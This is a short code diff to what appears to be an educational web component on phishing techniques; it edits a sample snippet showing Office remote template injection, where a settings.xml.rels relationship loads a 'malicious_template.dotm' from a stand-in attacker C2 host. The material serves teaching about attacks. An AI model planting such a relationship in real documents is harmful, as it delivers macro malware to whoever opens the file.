@@ -114,7 +114,7 @@ const Topic3 = () => {
       codeSnippet: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) -->
 <Relationship Id="rId1" 
   Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
-  Target="https://c2.evil-gateway.in/malicious_template.dotm" 
+  Target="https://attacker-c2.net/malicious_template.dotm" 
   TargetMode="External" />`
     },
     callback_phishing_toad: {
